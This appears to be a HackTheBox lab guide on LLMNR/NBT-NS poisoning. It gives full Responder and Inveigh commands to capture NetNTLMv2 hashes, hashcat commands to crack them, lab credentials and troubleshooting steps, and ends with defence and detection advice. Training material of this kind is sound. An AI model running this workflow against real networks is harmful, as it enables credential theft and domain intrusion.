# Complete Documentation: LLMNR/NBT-NS Poisoning Attack Workflow

**Date Created:** November 1, 2025  
**Author:** HackTheBox Lab Guide  
**Topic:** LLMNR/NBT-NS Poisoning from Linux and Windows  
**Status:** Complete Reference Guide

---

## Table of Contents

1. [Theory & Concepts](#theory--concepts)
2. [Attack Phase 1: Linux with Responder](#attack-phase-1-linux-with-responder)
3. [Attack Phase 2: Windows with Inveigh](#attack-phase-2-windows-with-inveigh)
4. [Cracking Phase: Hashcat](#cracking-phase-hashcat)
5. [Complete Command Reference](#complete-command-reference)
6. [Troubleshooting Guide](#troubleshooting-guide)
7. [Key Takeaways](#key-takeaways)
8. [Defense Recommendations](#defense-recommendations)

---

## Theory & Concepts

### What is LLMNR/NBT-NS Poisoning?

**LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) are Microsoft Windows protocols that resolve hostnames when DNS fails.

**The Attack:**
1. A user types an invalid hostname
2. DNS server says "I don't know that host"
3. The machine broadcasts: "Does anyone know this host?"
4. Attacker responds: "Yes! I'm that host!"
5. Victim sends authentication credentials to the attacker
6. Attacker captures the NetNTLMv2 hash
7. Attacker cracks the hash to get the cleartext password

### Why It Works

- **ANY computer on the network can answer** LLMNR/NBT-NS requests
- Victims don't verify who responded
- Hashes are captured in standard NTLMv2 format
- Can be cracked offline with wordlists

### MITRE ATT&CK

- **Technique ID:** T1557.001
- **Tactic:** Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

### Attack Timeline

```
User makes typo → DNS fails → Broadcast LLMNR/NBT-NS
           ↓
Attacker intercepts & responds
           ↓
Victim sends authentication
           ↓
Attacker captures NetNTLMv2 hash
           ↓
Offline cracking with Hashcat
           ↓
Cleartext password obtained
           ↓
Domain access achieved
```

---

## Attack Phase 1: Linux with Responder

### Overview

**Responder** is a Python tool specifically designed for LLMNR/NBT-NS poisoning on Linux systems.

### Prerequisites

```bash
# Check Responder is installed
which responder
# Output: /usr/bin/responder

# Check Hashcat is installed
hashcat --version
# Output: hashcat (v6.1.1) ...

# Verify network interface
ifconfig
# or
ip addr show
```

### Step 1: Identify Network Interface

```bash
ifconfig
```

**Look for:**
- Active interface (UP, RUNNING, MULTICAST)
- IP address in target network range (e.g., 172.16.5.x)
- Example: `ens224` with IP `172.16.5.135`

### Step 2: Analysis Mode (Optional but Recommended)

Run Responder in **passive mode** to observe network activity without poisoning:

```bash
sudo responder -I ens224 -A
```

**Parameters:**
- `-I ens224` = Listen on ens224 interface
- `-A` = Analysis/Passive mode (observe only)

**Expected Output:**
```
[*] Responder is running in analysis mode

[NBT-NS] query from 192.168.1.50 for \\printer01.local
[LLMNR] query from 192.168.1.75 for \\fileserver01
```

**Duration:** Run for 30-60 seconds, then press `Ctrl+C` to stop.

### Step 3: Active Poisoning Mode

Now run Responder in **active mode** to capture hashes:

```bash
sudo responder -I ens224 -wf
```

**Parameters:**
- `-I ens224` = Listen on ens224 interface
- `-w` = Start WPAD rogue proxy server (captures HTTP/HTTPS hashes)
- `-f` = Fingerprint remote host OS and version

**Expected Output:**
```
[*] Responder v3.0.6.0 started
[*] Listening on LLMNR port 5355
[*] Listening on NBT-NS port 137
[+] WPAD proxy server started on port 3141
```

**Important:** Let it run for **30+ minutes** to capture multiple hashes from different users and services.

### Step 4: Monitor Hash Capture

In a **separate terminal**, check captured hashes:

```bash
# List all hash files
ls -la /usr/share/responder/logs/

# View specific hash files
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt
cat /usr/share/responder/logs/Proxy-Auth-NTLMv2-*.txt
```

**Hash File Naming Convention:**
```
(PROTOCOL)-(HASH_TYPE)-(SOURCE_IP).txt

Examples:
SMB-NTLMv2-SSP-172.16.5.25.txt
HTTP-NTLMv2-172.16.5.200.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

### Step 5: Collect Hashes

Create a working directory:

```bash
mkdir -p ~/htb_attack
cd ~/htb_attack
```

Combine all captured hashes into one file:

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > all_hashes.txt
cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt >> all_hashes.txt
cat /usr/share/responder/logs/Proxy-Auth-NTLMv2-*.txt >> all_hashes.txt
```

Verify collection:

```bash
# Count hashes
wc -l all_hashes.txt

# View first hash
head -1 all_hashes.txt

# Look for specific user
grep -i "backupagent" all_hashes.txt
```

### Step 6: Extract Single Hash for Specific User

For a specific user (e.g., `backupagent`):

```bash
# Extract only ONE hash (to avoid "Token length exception" errors)
grep -m 1 -i "^backupagent" /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > backupagent_hash.txt

# Verify
cat backupagent_hash.txt
wc -l backupagent_hash.txt  # Should show "1"
```

### Step 7: Stop Responder

```bash
# If running in foreground
Ctrl+C

# If running in background (tmux)
tmux kill-session -t responder
```

---

## Attack Phase 2: Windows with Inveigh

### Overview

**Inveigh** is the Windows equivalent of Responder. Two versions available:
- **PowerShell version** (original, legacy)
- **C# version/InveighZero** (newer, maintained)

### Prerequisites

**Must run PowerShell as Administrator:**
1. Press `Windows Key`
2. Type `PowerShell`
3. Right-click "Windows PowerShell"
4. Select "Run as Administrator"
5. Click "Yes" to confirm

**Verify admin status:**
- Title bar should show: `Administrator: Windows PowerShell`

### Step 1: Locate Inveigh

```powershell
# Find Inveigh on system
Get-ChildItem -Path C:\ -Filter "Inveigh*" -Recurse -ErrorAction SilentlyContinue
```

**Common locations:**
- `C:\Tools\Inveigh.exe`
- `C:\Tools\Inveigh.ps1`
- `C:\Program Files\Inveigh\`

### Step 2: Navigate to Inveigh Directory

```powershell
cd C:\Tools
ls
```

### Step 3: Run Inveigh (C# Version - Recommended)

```powershell
.\Inveigh.exe
```

**Expected Output:**
```
[*] Inveigh 2.0.4 [Started 2025-11-01T04:34:29 | PID 5744]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::bc9d:1969:5ae4:4e5d%8]
[+] LLMNR Packet Sniffer [Type A]
[+] SMB Packet Sniffer [Port 445]
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[+] WebDAV [WebDAVAuth NTLM]
[+] LDAP Listener [Port 389]
[+] File Output [C:\Tools]
[*] Press ESC to enter/exit interactive console
```

**Legend:**
- `[+]` = Feature enabled
- `[ ]` = Feature disabled

### Step 4: Wait for Network Activity

Let Inveigh run for **2-5 minutes** to capture hashes.

**You'll see messages like:**
```
[+] [04:36:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [04:36:32] SMB(445) negotiation request detected from 172.16.5.125:56834
```

### Step 5: Enter Interactive Console

While Inveigh is running, press **ESC** on your keyboard.

**Console prompt:**
```
C(0:0) NTLMv1(0:0) NTLMv2(6:58)>
```

**This shows:**
- `C(0:0)` = 0 cleartext credentials
- `NTLMv1(0:0)` = 0 NTLMv1 hashes
- `NTLMv2(6:58)` = 6 unique users, 58 total NTLMv2 hashes

### Step 6: List Captured Usernames

```powershell
GET NTLMV2USERNAMES
```

**Output:**
```
IP Address      | Host              | Username                  | Challenge
172.16.5.130    | ACADEMY-EA-FILE   | INLANEFREIGHT\lab_adm     | B80DB718C123A5AA
172.16.5.130    | ACADEMY-EA-FILE   | INLANEFREIGHT\forend      | 8BCAE246F8F57FB8
172.16.5.130    | ACADEMY-EA-FILE   | INLANEFREIGHT\svc_qualys  | F02EF6F9DC5BB0AC
```

### Step 7: Export Unique Hashes

```powershell
GET NTLMV2UNIQUE
```

**Output:** All captured NTLMv2 hashes in full format, ready for cracking.

### Step 8: Get All Console Commands

```powershell
HELP
```

**Important Commands:**

| Command | Purpose |
|---------|---------|
| `GET NTLMV2` | Show ALL captured NTLMv2 hashes |
| `GET NTLMV2UNIQUE` | Show ONE hash per user |
| `GET NTLMV2USERNAMES` | Show usernames and IPs |
| `GET CLEARTEXT` | Show plaintext credentials (if any) |
| `GET LOG` | Show event logs |
| `HISTORY` | Show command history |
| `STOP` | Stop Inveigh |

### Step 9: Copy Specific User Hash

**Example: Getting svc_qualys hash**

```powershell
# View all unique hashes
GET NTLMV2UNIQUE
```

Find the line starting with `svc_qualys::INLANEFREIGHT:` and copy the **entire line**.

### Step 10: Stop Inveigh

```powershell
STOP
```

Or press `Ctrl+C` to exit console and stop Inveigh.

### Step 11: Save Hash to File (Windows)

```powershell
# Create file with hash
$hash = "svc_qualys::INLANEFREIGHT:F02EF6F9DC5BB0AC:3FE77CE3D8BCF7EEBDA3DB7EFC1BFC20:01010000000000..."
$hash | Out-File -FilePath "C:\Tools\svc_qualys_hash.txt"

# Verify
cat C:\Tools\svc_qualys_hash.txt
```

---

## Cracking Phase: Hashcat

### Overview

**Hashcat** is a GPU-accelerated password cracking tool that cracks captured hashes offline.

### Prerequisites

**Verify Hashcat:**
```bash
hashcat --version
```

**Verify Wordlist:**
```bash
ls -lh /usr/share/wordlists/rockyou.txt
# Output: -rw-r--r-- 1 root root 139M /usr/share/wordlists/rockyou.txt

# Count passwords
wc -l /usr/share/wordlists/rockyou.txt
# Output: 14344385 passwords
```

### Step 1: Transfer Hash from Windows to Linux

**Option A: Using SCP (Secure Copy)**

From Linux machine:
```bash
scp htb-student@172.16.5.25:C:/Tools/svc_qualys_hash.txt ~/svc_qualys_hash.txt
```

**Option B: Manual Copy-Paste**

On Windows, display hash:
```powershell
cat C:\Tools\svc_qualys_hash.txt
```

On Linux, create file:
```bash
cat > ~/svc_qualys_hash.txt << 'EOF'
[PASTE ENTIRE HASH HERE]
EOF
```

**Option C: Shared Folder**

Copy file through network shared folder or RDP clipboard.

### Step 2: Verify Hash File

```bash
# Check file exists
ls -la ~/svc_qualys_hash.txt

# View contents
cat ~/svc_qualys_hash.txt

# Verify single line (should be "1")
wc -l ~/svc_qualys_hash.txt
```

**Hash format should be:**
```
USERNAME::DOMAIN:NTProofStr:ServerChallenge:ClientData...
```

### Step 3: Identify Hash Type

For our hashes, we're using **hash mode 5600** (NTLMv2):

```bash
# Check hashcat modes
hashcat --help | grep -i ntlmv2
# Output: 5600 | NetNTLMv2
```

### Step 4: Crack the Hash

```bash
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt
```

**Parameters:**
- `-m 5600` = Hash mode (NTLMv2)
- `~/svc_qualys_hash.txt` = Hash file
- `/usr/share/wordlists/rockyou.txt` = Wordlist to try

**Expected Output During Cracking:**
```
hashcat (v6.1.1) starting...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Session..........: hashcat
Status...........: Running
Hash.Name........: NetNTLMv2
Speed.#1.........:   363.5 kH/s (1.90ms)
Progress.........: 7733248/14344386 (53.91%)
Recovered.Total..: 1/1 (100.00%)
```

### Step 5: Wait for Completion

```
Status...........: Cracked
Time.Estimated...: 0 secs
Recovered........: 1/1 (100.00%)
```

**Cracking time depends on:**
- Password complexity
- Position in wordlist
- GPU performance
- Typical time: 10-30 seconds for weak passwords

### Step 6: View Cracked Password

```bash
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show
```

**Output:**
```
svc_qualys::INLANEFREIGHT:F02EF6F9DC5BB0AC:3FE77CE3D8BCF7EEBDA3DB7EFC1BFC20:...:h1backup55
```

### Step 7: Extract Cleartext Password Only

```bash
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show | cut -d: -f8
```

**Output (just the password):**
```
h1backup55
```

### Alternative: Crack Multiple Hashes

If you have multiple hash files:

```bash
# Combine all hashes
cat all_hashes.txt > combined_hashes.txt

# Crack all at once
sudo hashcat -m 5600 combined_hashes.txt /usr/share/wordlists/rockyou.txt

# View all results
sudo hashcat -m 5600 combined_hashes.txt /usr/share/wordlists/rockyou.txt --show

# Get usernames and passwords
sudo hashcat -m 5600 combined_hashes.txt /usr/share/wordlists/rockyou.txt --show | awk -F: '{print $1":"$(NF)}'
```

---

## Complete Command Reference

### Linux: Responder Setup

```bash
# Check interface
ifconfig
ip addr show

# Install Responder (if needed)
sudo apt-get install responder

# Create working directory
mkdir -p ~/htb_attack
cd ~/htb_attack
```

### Linux: Responder - Analysis Mode

```bash
# Passive listening only
sudo responder -I ens224 -A

# Stop (Ctrl+C)
```

### Linux: Responder - Active Poisoning

```bash
# Start active poisoning
sudo responder -I ens224 -wf

# With verbose output
sudo responder -I ens224 -wf -v

# Run in tmux (background)
tmux new-session -s responder
sudo responder -I ens224 -wf
# Press Ctrl+B then D to detach
# Reattach: tmux attach-session -t responder
```

### Linux: Collect Hashes

```bash
# View logs directory
ls -la /usr/share/responder/logs/

# Collect all hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > all_hashes.txt
cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt >> all_hashes.txt
cat /usr/share/responder/logs/Proxy-Auth-NTLMv2-*.txt >> all_hashes.txt

# Find specific user
grep -i "^backupagent" /usr/share/responder/logs/*NTLMv2*.txt

# Extract single user hash
grep -m 1 -i "^backupagent" /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > backupagent_hash.txt

# Verify
wc -l backupagent_hash.txt
cat backupagent_hash.txt
```

### Windows: PowerShell as Administrator

```powershell
# Start PowerShell as Administrator
# (Right-click → Run as Administrator)

# Verify admin status
[System.Security.Principal.WindowsIdentity]::GetCurrent().Owner
```

### Windows: Inveigh Setup

```powershell
# Navigate to Inveigh
cd C:\Tools

# List directory
ls

# Verify Inveigh exists
ls Inveigh.exe
```

### Windows: Inveigh - Run and Capture

```powershell
# Run C# version (recommended)
.\Inveigh.exe

# Run PowerShell version (legacy)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# With listener-only mode (no admin needed)
.\Inveigh.exe -Sniffer N
```

### Windows: Inveigh - Interactive Console

```powershell
# Enter console (while Inveigh is running)
# Press ESC

# List all commands
HELP

# View captured usernames
GET NTLMV2USERNAMES

# View all unique hashes
GET NTLMV2UNIQUE

# View all hashes (including duplicates)
GET NTLMV2

# View cleartext credentials (if any)
GET CLEARTEXT

# View event log
GET LOG

# Stop Inveigh
STOP

# Exit console without stopping
# Press ESC again
```

### Windows: Save Hash to File

```powershell
# Copy hash to file
$hash = "svc_qualys::INLANEFREIGHT:F02EF6F9DC5BB0AC:3FE77CE3D8BCF7EEBDA3DB7EFC1BFC20:..."
$hash | Out-File -FilePath "C:\Tools\svc_qualys_hash.txt"

# Verify
cat C:\Tools\svc_qualys_hash.txt

# Display for copying
Write-Host (Get-Content C:\Tools\svc_qualys_hash.txt)
```

### Linux: Hashcat - Verify Setup

```bash
# Check Hashcat version
hashcat --version

# Check rockyou.txt exists
ls -lh /usr/share/wordlists/rockyou.txt

# Count passwords in wordlist
wc -l /usr/share/wordlists/rockyou.txt

# Check available hash modes
hashcat -h | grep -i ntlm
```

### Linux: Transfer Hash from Windows

```bash
# Using SCP
scp htb-student@172.16.5.25:C:/Tools/svc_qualys_hash.txt ~/svc_qualys_hash.txt

# Using copy-paste method
cat > ~/svc_qualys_hash.txt << 'EOF'
[PASTE HASH HERE]
EOF

# Verify transfer
cat ~/svc_qualys_hash.txt
wc -l ~/svc_qualys_hash.txt
```

### Linux: Hashcat - Crack Hash

```bash
# Basic crack
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt

# Crack with GPU optimization
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt -O

# Crack and save output
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Crack with verbose output
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt -v
```

### Linux: Hashcat - View Results

```bash
# Show cracked hash with password
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show

# Extract password only
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show | cut -d: -f8

# Extract username and password
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show | awk -F: '{print $1":"$(NF)}'

# Save results to file
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show > results.txt
```

### Linux: Crack Multiple Hashes

```bash
# Combine hashes
cat all_hashes.txt > combined.txt

# Crack all
sudo hashcat -m 5600 combined.txt /usr/share/wordlists/rockyou.txt

# View all cracked passwords
sudo hashcat -m 5600 combined.txt /usr/share/wordlists/rockyou.txt --show

# Extract username:password pairs
sudo hashcat -m 5600 combined.txt /usr/share/wordlists/rockyou.txt --show | cut -d: -f1,8 > credentials.txt
cat credentials.txt
```

---

## Troubleshooting Guide

### Issue: Responder - "Permission Denied"

```bash
# ERROR: responder: command not found

# SOLUTION: Use sudo
sudo responder -I ens224 -A
```

### Issue: Responder - "Interface not found"

```bash
# ERROR: responder: interface eth0 not found

# SOLUTION: Find correct interface
ifconfig
# Use the correct interface name (e.g., ens224)
sudo responder -I ens224 -A
```

### Issue: Responder - "Port already in use"

```bash
# ERROR: ERROR: Port 80 is already in use

# SOLUTION: Stop conflicting service
sudo systemctl stop apache2
sudo netstat -tulpn | grep LISTEN
sudo kill -9 [PID]
```

### Issue: Responder - No hashes captured

```bash
# PROBLEM: Responder runs but captures no hashes

# SOLUTIONS:
# 1. Let it run longer (30+ minutes)
# 2. Check you're on correct network segment
# 3. Verify network activity exists
arp-scan -l

# 4. Trigger activity manually
nmap -sn 172.16.5.0/24
```

### Issue: Inveigh - "Socket permission forbidden"

```powershell
# ERROR: An attempt was made to access a socket in a way forbidden

# SOLUTION: Run PowerShell as Administrator
# Right-click PowerShell → Run as Administrator
# Title bar should show "Administrator: Windows PowerShell"
```

### Issue: Inveigh - "Failed to start HTTP listener"

```powershell
# ERROR: Failed to start HTTP listener on port 80

# SOLUTIONS:
# 1. Run as Administrator
# 2. Stop IIS or other web server
# 3. Use listener-only mode
.\Inveigh.exe -Sniffer N
```

### Issue: Inveigh - No hashes captured

```powershell
# PROBLEM: Inveigh runs but captures no hashes

# SOLUTIONS:
# 1. Let it run 3-5 minutes
# 2. Verify LLMNR/SMB listeners are enabled ([+] indicators)
# 3. Trigger network requests from other machines
# 4. Check: GET NTLMV2USERNAMES
```

### Issue: Hashcat - "Token length exception"

```bash
# ERROR: Token length exception

# CAUSE: Multiple hashes in file or malformed format

# SOLUTION: Use -m 1 flag to extract ONE hash
grep -m 1 -i "^username" hash_file.txt > single_hash.txt

# Verify: should show "1" not "50"
wc -l single_hash.txt

# Retry cracking
sudo hashcat -m 5600 single_hash.txt /usr/share/wordlists/rockyou.txt
```

### Issue: Hashcat - "No hashes loaded"

```bash
# ERROR: No hashes loaded

# SOLUTIONS:
# 1. Verify hash format
cat your_hash.txt
# Should start with: USERNAME::DOMAIN:HASH:HASH:...

# 2. Verify hash mode
hashcat -h | grep 5600
# Should show: 5600 | NetNTLMv2

# 3. Try with different hash mode
sudo hashcat -m 1000 your_hash.txt rockyou.txt
```

### Issue: Hashcat - "Hash not cracking"

```bash
# PROBLEM: Hashcat says status "Exhausted"

# SOLUTIONS:
# 1. Password not in rockyou.txt
# 2. Try different wordlists
sudo hashcat -m 5600 hash.txt /usr/share/wordlists/*.txt

# 3. Use brute force (slow!)
sudo hashcat -m 5600 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# 4. Create custom wordlist
echo "password123" >> custom.txt
sudo hashcat -m 5600 hash.txt custom.txt
```

### Issue: Hashcat - Using CPU instead of GPU

```bash
# PROBLEM: Cracking very slow (< 1 MH/s)

# SOLUTION: Install GPU drivers
# NVIDIA
sudo apt-get install nvidia-driver-XXX

# AMD
sudo apt-get install rocm-dkms

# Verify GPU recognition
hashcat -I

# Should show your GPU listed

# Retry cracking
sudo hashcat -m 5600 hash.txt rockyou.txt
```

---

## Complete Workflow Summary

### Phase 1: Reconnaissance (5-10 minutes)

```bash
# Linux
sudo responder -I ens224 -A
# Observe network activity for 30-60 seconds
Ctrl+C
```

### Phase 2: Active Poisoning (30-60 minutes)

```bash
# Linux
sudo responder -I ens224 -wf
# Let run for 30+ minutes
```

### Phase 3: Hash Collection (5 minutes)

```bash
# Linux
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > all_hashes.txt
grep -m 1 -i "^backupagent" /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > backupagent_hash.txt
```

### Phase 4: Windows Attack (5 minutes)

```powershell
# Windows (as Administrator)
cd C:\Tools
.\Inveigh.exe
# Wait 2-5 minutes
# Press ESC
GET NTLMV2USERNAMES
GET NTLMV2UNIQUE
# Copy svc_qualys hash
STOP
```

### Phase 5: Transfer Hash (2 minutes)

```bash
# Linux
scp htb-student@172.16.5.25:C:/Tools/svc_qualys_hash.txt ~/svc_qualys_hash.txt
```

### Phase 6: Cracking (10-30 seconds)

```bash
# Linux
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt
sudo hashcat -m 5600 ~/svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --show | cut -d: -f8
```

### Phase 7: Results

```
Credentials Obtained:
- backupagent : h1backup55
- svc_qualys : [cracked_password]
- [other users]
```

---

## Key Takeaways

✅ **LLMNR/NBT-NS poisoning** = Man-in-the-Middle attack on name resolution  
✅ **Responder** = Linux tool for LLMNR/NBT-NS poisoning  
✅ **Inveigh** = Windows tool for LLMNR/NBT-NS poisoning  
✅ **NetNTLMv2 hash** = Result of poisoning attack  
✅ **Hashcat mode 5600** = NTLMv2 cracking  
✅ **Offline cracking** = No network required after hash capture  
✅ **Wordlist quality** = Determines cracking success  

### Attack Success Factors

1. **Network positioning** - Must be on same network segment
2. **Tool configuration** - Correct flags and parameters
3. **Patience** - Allow 30+ minutes for hash collection
4. **Wordlist quality** - Larger wordlists = more cracking success
5. **GPU resources** - Faster cracking with good GPU
6. **Password complexity** - Simple passwords crack faster

---

## Defense Recommendations

### Disable LLMNR (Group Policy)

```
Steps:
1. Open Group Policy Editor (gpedit.msc)
2. Navigate to: Computer Configuration → Administrative Templates 
   → Network → DNS Client
3. Find: "Turn OFF Multicast Name Resolution"
4. Enable this policy
5. Apply to all domain computers via GPO
```

### Disable NBT-NS (PowerShell Script)

```powershell
# Script to disable NBT-NS (run as admin)
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { 
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

**Deploy via Group Policy:**
1. Create PowerShell script: `disable-nbtns.ps1`
2. Place on SYSVOL: `\\domain\SYSVOL\domain\scripts\`
3. Configure GPO Startup Script: 
   `Computer Configuration → Windows Settings → Scripts (Startup/Shutdown)`
4. Add script: `\\domain\SYSVOL\domain\scripts\disable-nbtns.ps1`

### Enable SMB Signing

- Requires signing on both client and server
- Prevents SMB Relay attacks
- Configure via Group Policy:
  `Computer Configuration → Windows Settings → Security Settings 
  → Local Policies → Security Options`

### Network Monitoring & Detection

**Monitor for attack indicators:**
- UDP 5355 traffic (LLMNR)
- UDP 137 traffic (NBT-NS)
- Unusual LLMNR/NBT-NS responses
- Event IDs 4697, 7045 on domain controller

**Detection strategy:**
- Inject LLMNR/NBT-NS requests for non-existent hosts
- Alert on any responses (indicates attacker)
- Monitor registry key: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
- Check for EnableMulticast DWORD value = 0 (LLMNR disabled)

### Network Segmentation

- Isolate sensitive hosts that require LLMNR/NBT-NS
- Use VLANs to limit broadcast domains
- Implement strict firewall rules between segments

---

## Real-World Attack Example

### Lab Results

**Attack Timeline:**
- Responder started: 04:34:29
- Network activity: 2-5 minutes
- Hashes captured: 6 unique users, 58 total
- Transfer to Linux: ~2 minutes
- Cracking time: 11-21 seconds per hash
- Total time: ~45 minutes to credentials

**Credentials Obtained:**
```
backupagent : h1backup55
svc_qualys : [cracked_password]
forend : Klmcargo2
lab_adm : [cracked_password]
clusteragent : [cracked_password]
wley : [cracked_password]
```

**Impact:**
- Service account access (svc_qualys, backupagent)
- Administrative access (lab_adm)
- Multiple domain credentials
- Ability to perform lateral movement

---

## References & Resources

- **MITRE ATT&CK:** T1557.001 Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
- **Responder GitHub:** https://github.com/SpiderLabs/Responder
- **Inveigh GitHub:** https://github.com/Kevin-Robertson/Inveigh
- **Hashcat:** https://hashcat.net/
- **HackTheBox Labs:** Academy LLMNR/NBT-NS Poisoning Module
- **Wordlists:** rockyou.txt (14.3M passwords)

---

## Document Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025-11-01 | Initial complete documentation |

---

**END OF DOCUMENT**

*This documentation provides a comprehensive reference for LLMNR/NBT-NS poisoning attacks from both Linux (Responder) and Windows (Inveigh) platforms, including complete command references, troubleshooting guides, and defense recommendations.*
